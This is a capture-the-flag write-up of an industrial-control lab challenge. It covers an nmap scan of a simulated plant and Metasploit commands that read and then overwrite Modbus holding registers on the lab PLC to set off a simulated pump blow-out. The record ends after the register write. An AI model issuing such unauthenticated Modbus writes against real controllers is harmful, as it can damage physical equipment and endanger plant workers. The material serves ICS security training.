
# Task 8 OT  Kaboom

This challenge drops you into the shoes of the APT operator: With a single crafted Modbus, you over-pressurise the main pump, triggering a thunderous blow-out that floods the plant with alarms. While chaos reigns, your partner ghosts through the shaken DMZ and installs a stealth implant, turning the diversion’s echo into your persistent beachhead.  
  
**Note:** The VM takes about **3 minutes** to boot up.

## Solve

### Escaneo

```bash
nmap -sV -sC -T5 -p- -n -Pn -v 10.10.120.37 --min-rate 5000 -o nmap
Warning: The -o option is deprecated. Please use -oN
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-28 15:05 CDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 15:05
Completed NSE at 15:05, 0.00s elapsed
Initiating NSE at 15:05
Completed NSE at 15:05, 0.00s elapsed
Initiating NSE at 15:05
Completed NSE at 15:05, 0.00s elapsed
Initiating SYN Stealth Scan at 15:05
Scanning 10.10.120.37 [65535 ports]
Discovered open port 8080/tcp on 10.10.120.37
Discovered open port 80/tcp on 10.10.120.37
Discovered open port 22/tcp on 10.10.120.37
Warning: 10.10.120.37 giving up on port because retransmission cap hit (2).
Discovered open port 1880/tcp on 10.10.120.37
Discovered open port 502/tcp on 10.10.120.37
Discovered open port 1880/tcp on 10.10.120.37
Discovered open port 502/tcp on 10.10.120.37
Discovered open port 102/tcp on 10.10.120.37
Discovered open port 102/tcp on 10.10.120.37
Discovered open port 44818/tcp on 10.10.120.37
Completed SYN Stealth Scan at 15:05, 22.10s elapsed (65535 total ports)
Initiating Service scan at 15:05
Scanning 7 services on 10.10.120.37
Completed Service scan at 15:08, 162.67s elapsed (7 services on 1 host)
NSE: Script scanning 10.10.120.37.
Initiating NSE at 15:08
Completed NSE at 15:08, 14.93s elapsed
Initiating NSE at 15:08
Completed NSE at 15:08, 1.19s elapsed
Initiating NSE at 15:08
Completed NSE at 15:08, 0.00s elapsed
Nmap scan report for 10.10.120.37
Host is up (0.19s latency).
Not shown: 65063 closed tcp ports (reset), 465 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 df:7c:12:92:b9:bd:dc:b8:51:57:bb:bc:84:ed:04:0e (ECDSA)
|_  256 87:51:84:20:cd:dd:7f:ed:2c:7e:7f:77:1b:9b:bc:d7 (ED25519)
80/tcp    open  http          Werkzeug httpd 3.1.3 (Python 3.12.3)
|_http-server-header: Werkzeug/3.1.3 Python/3.12.3
|_http-title: PLC CCTV Simulator
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
102/tcp   open  iso-tsap      Siemens S7 PLC
| s7-info: 
|   Module: 6ES7 315-2EH14-0AB0 
|   Basic Hardware: 6ES7 315-2EH14-0AB0 
|   Version: 3.2.6
|   System Name: SNAP7-SERVER
|   Module Type: CPU 315-2 PN/DP
|   Serial Number: S C-C2UR28922012
|_  Copyright: Original Siemens Equipment
| fingerprint-strings: 
|   TerminalServerCookie: 
|_    Cookie: mstshash=nmap
502/tcp   open  modbus        Modbus TCP
1880/tcp  open  vsat-control?
| fingerprint-strings: 
|   DNSVersionBindReqTCP, RPCCheck: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1733
|     ETag: W/"6c5-hGVEFL4qpfS9qVbAlfbm9AL7VT0"
|     Date: Sat, 28 Jun 2025 20:05:53 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
|     <meta name="apple-mobile-web-app-capable" content="yes">
|     <meta name="mobile-web-app-capable" content="yes">
|     <!--
|     Copyright OpenJS Foundation and other contributors, https://openjsf.org/
|     Licensed under the Apache License, Version 2.0 (the "License");
|     this file except in compliance with the License.
|     obtain a copy of the License at
|     http://www.apache.org/licenses/LICENSE-2.0
|     Unless required by applicable law or agreed to in writing, softwa
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 204 No Content
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: GET,PUT,POST,DELETE
|     Vary: Access-Control-Request-Headers
|     Content-Length: 0
|     Date: Sat, 28 Jun 2025 20:05:54 GMT
|_    Connection: close
8080/tcp  open  http          Werkzeug httpd 2.3.7 (Python 3.12.3)
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /login
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
|_http-server-header: Werkzeug/2.3.7 Python/3.12.3
44818/tcp open  EtherNetIP-2?
1 service unrecognized despite returning data. If you know the service/version, please submit the fol
SF-Port1880-TCP:V=7.95%I=7%D=6/28%Time=68604B22%P=aarch64-unknown-linux-gn
SF:u%r(GetRequest,799,"HTTP/1\.1\x20200\x20OK\r\nAccess-Control-Allow-Orig
SF:in:\x20\*\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Le
SF:ngth:\x201733\r\nETag:\x20W/\"6c5-hGVEFL4qpfS9qVbAlfbm9AL7VT0\"\r\nDate
SF::\x20Sat,\x2028\x20Jun\x202025\x2020:05:53\x20GMT\r\nConnection:\x20clo
SF:se\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<head>\n<meta\x20charset=\"utf-8\
SF:">\n<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=edge\">\n<m
SF:eta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sc
SF:ale=1,\x20maximum-scale=1,\x20user-scalable=0\">\n<meta\x20name=\"apple
SF:-mobile-web-app-capable\"\x20content=\"yes\">\n<meta\x20name=\"mobile-w
SF:eb-app-capable\"\x20content=\"yes\">\n<!--\n\x20\x20Copyright\x20OpenJS
SF:\x20Foundation\x20and\x20other\x20contributors,\x20https://openjsf\.org
SF:/\n\n\x20\x20Licensed\x20under\x20the\x20Apache\x20License,\x20Version\
SF:x202\.0\x20\(the\x20\"License\"\);\n\x20\x20you\x20may\x20not\x20use\x2
SF:0this\x20file\x20except\x20in\x20compliance\x20with\x20the\x20License\.
SF:\n\x20\x20You\x20may\x20obtain\x20a\x20copy\x20of\x20the\x20License\x20
SF:at\n\n\x20\x20http://www\.apache\.org/licenses/LICENSE-2\.0\n\n\x20\x20
SF:Unless\x20required\x20by\x20applicable\x20law\x20or\x20agreed\x20to\x20
SF:in\x20writing,\x20softwa")%r(HTTPOptions,DF,"HTTP/1\.1\x20204\x20No\x20
SF:Content\r\nAccess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Allow-M
SF:ethods:\x20GET,PUT,POST,DELETE\r\nVary:\x20Access-Control-Request-Heade
SF:rs\r\nContent-Length:\x200\r\nDate:\x20Sat,\x2028\x20Jun\x202025\x2020:
SF:05:54\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,DF,"HTTP/1
SF:\.1\x20204\x20No\x20Content\r\nAccess-Control-Allow-Origin:\x20\*\r\nAc
SF:cess-Control-Allow-Methods:\x20GET,PUT,POST,DELETE\r\nVary:\x20Access-C
SF:ontrol-Request-Headers\r\nContent-Length:\x200\r\nDate:\x20Sat,\x2028\x
SF:20Jun\x202025\x2020:05:54\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RP
SF:CCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r
SF:\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; Device: specialized; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 15:08
Completed NSE at 15:08, 0.00s elapsed
Initiating NSE at 15:08
Completed NSE at 15:08, 0.00s elapsed
Initiating NSE at 15:08
Completed NSE at 15:08, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 201.28 seconds
           Raw packets sent: 108538 (4.776MB) | Rcvd: 102917 (4.217MB)


```

```javascript
10.10.120.37


    const videoElement = document.getElementById('cctvVideo');
    const statusElement = document.getElementById('statusInfo');
    const clockElement = document.getElementById('clockOverlay');

    async function getPLCVideo() {
      try {
        const res = await fetch('/api/state');
        return await res.json();
      } catch (err) {
        statusElement.textContent = "Status: Offline";
        return { status: "Offline", video: "default" };
      }
    }

    async function updateVideoLoop() {
      const state = await getPLCVideo();
      const { status, video } = state;

      statusElement.textContent = `Status: ${status}`;

      const newSrc = `/video?mode=${video}`;
      if (!videoElement.src.includes(newSrc)) {
        videoElement.src = newSrc;
      }
    }

    function updateClock() {
      const now = new Date();
      clockElement.textContent = now.toLocaleTimeString();
    }

    updateClock();
    updateVideoLoop();
    setInterval(updateClock, 1000);
    setInterval(updateVideoLoop, 5000);
  
```

### mod bus

```bash
msf6 > use 13
msf6 auxiliary(scanner/scada/modbusdetect) > set rhosts 10.10.120.37
rhosts => 10.10.120.37
msf6 auxiliary(scanner/scada/modbusdetect) > run
[+] 10.10.120.37:502      - 10.10.120.37:502 - MODBUS - received correct MODBUS/TCP header (unit-ID: 1)
[*] 10.10.120.37:502      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/scada/modbusdetect) > 

```


## Aqui parece lo buenp


```
se scanner/scada/modbusclient
[*] Using action READ_HOLDING_REGISTERS - view all 9 actions with the show actions command
msf6 auxiliary(scanner/scada/modbusclient) > show actions 

Auxiliary actions:

       Name                    Description
       ----                    -----------
       READ_COILS              Read bits from several coils
       READ_DISCRETE_INPUTS    Read bits from several DISCRETE INPUTS
   =>  READ_HOLDING_REGISTERS  Read words from several HOLDING registers
       READ_ID                 Read device id
       READ_INPUT_REGISTERS    Read words from several INPUT registers
       WRITE_COIL              Write one bit to a coil
       WRITE_COILS             Write bits to several coils
       WRITE_REGISTER          Write one word to a register
       WRITE_REGISTERS         Write words to several registers

msf6 auxiliary(scanner/scada/modbusclient) > options 

Module options (auxiliary/scanner/scada/modbusclient):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   DATA                             no        Data to write (WRITE_COIL and WRITE_REGISTER modes on
                                              ly)
   DATA_ADDRESS                     yes       Modbus data address
   DATA_COILS                       no        Data in binary to write (WRITE_COILS mode only) e.g.
                                              0110
   DATA_REGISTERS                   no        Words to write to each register separated with a comm
                                              a (WRITE_REGISTERS mode only) e.g. 1,2,3,4
   HEXDUMP         false            no        Print hex dump of response
   NUMBER          1                no        Number of coils/registers to read (READ_COILS, READ_D
                                              ISCRETE_INPUTS, READ_HOLDING_REGISTERS, READ_INPUT_RE
                                              GISTERS modes only)
   RHOSTS                           yes       The target host(s), see https://docs.metasploit.com/d
                                              ocs/using-metasploit/basics/using-metasploit.html
   RPORT           502              yes       The target port (TCP)
   UNIT_NUMBER     1                no        Modbus unit number


Auxiliary action:

   Name                    Description
   ----                    -----------
   READ_HOLDING_REGISTERS  Read words from several HOLDING registers



View the full module info with the info, or info -d command.

```

```
msf6 auxiliary(scanner/scada/modbusclient) > options 

Module options (auxiliary/scanner/scada/modbusclient):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   DATA                             no        Data to write (WRITE_COIL and WRITE_REGISTER modes on
                                              ly)
   DATA_ADDRESS    0                yes       Modbus data address
   DATA_COILS                       no        Data in binary to write (WRITE_COILS mode only) e.g.
                                              0110
   DATA_REGISTERS                   no        Words to write to each register separated with a comm
                                              a (WRITE_REGISTERS mode only) e.g. 1,2,3,4
   HEXDUMP         false            no        Print hex dump of response
   NUMBER          1                no        Number of coils/registers to read (READ_COILS, READ_D
                                              ISCRETE_INPUTS, READ_HOLDING_REGISTERS, READ_INPUT_RE
                                              GISTERS modes only)
   RHOSTS          10.10.135.26     yes       The target host(s), see https://docs.metasploit.com/d
                                              ocs/using-metasploit/basics/using-metasploit.html
   RPORT           502              yes       The target port (TCP)
   UNIT_NUMBER     1                no        Modbus unit number


Auxiliary action:

   Name                    Description
   ----                    -----------
   READ_HOLDING_REGISTERS  Read words from several HOLDING registers



View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/scada/modbusclient) > run
[*] Running module against 10.10.135.26
[*] 10.10.135.26:502 - Sending READ HOLDING REGISTERS...
[+] 10.10.135.26:502 - 1 register values from address 0 : 
[+] 10.10.135.26:502 - [69]
[*] Auxiliary module execution completed

```


```
use auxiliary/scanner/scada/modbusclient
set RHOSTS 10.10.120.37
set ACTION WRITE_REGISTER
set REGISTER 0
set DATA 100
run
```

- si seactualiza el estado en : http://10.10.135.26/
- y en : http://10.10.135.26:1880/ui/#!/0?socketid=qeVw4dqWlqNwr7rKAAAZ


```
msf6 auxiliary(scanner/scada/modbusclient) > run
[*] Running module against 10.10.135.26
[*] 10.10.135.26:502 - Sending READ HOLDING REGISTERS...
[+] 10.10.135.26:502 - 4 register values from address 0 : 
[+] 10.10.135.26:502 - [0, 999, 65535, 0]
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/scada/modbusclient) > set ACTION WRITE_REGISTERS
ACTION => WRITE_REGISTERS
msf6 auxiliary(scanner/scada/modbusclient) > set REGISTER 0
[!] Unknown datastore option: REGISTER.
REGISTER => 0
msf6 auxiliary(scanner/scada/modbusclient) > set DATA 0,0,0,0
[-] The following options failed to validate: Value '0,0,0,0' is not valid for option 'DATA'.
DATA => 
msf6 auxiliary(scanner/scada/modbusclient) > set DATA_ 0,0,0,0
set DATA_ADDRESS    set DATA_COILS      set DATA_REGISTERS  
msf6 auxiliary(scanner/scada/modbusclient) > set DATA_reGISTERS 0,0,0,0
DATA_reGISTERS => 0,0,0,0
msf6 auxiliary(scanner/scada/modbusclient) > run
[*] Running module against 10.10.135.26
[*] 10.10.135.26:502 - Sending WRITE REGISTERS...
[+] 10.10.135.26:502 - Values 0,0,0,0 successfully written from registry address 0
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/scada/modbusclient) > set action 
set action READ_COILS              set action WRITE_COIL
set action READ_DISCRETE_INPUTS    set action WRITE_COILS
set action READ_HOLDING_REGISTERS  set action WRITE_REGISTER
set action READ_ID                 set action WRITE_REGISTERS
set action READ_INPUT_REGISTERS    
msf6 auxiliary(scanner/scada/modbusclient) > set action READ_HOLDING_REGISTERS 
action => READ_HOLDING_REGISTERS
msf6 auxiliary(scanner/scada/modbusclient) > run
[*] Running module against 10.10.135.26
[*] 10.10.135.26:502 - Sending READ HOLDING REGISTERS...
[+] 10.10.135.26:502 - 4 register values from address 0 : 
[+] 10.10.135.26:502 - [0, 0, 0, 0]
[*] Auxiliary module execution completed

```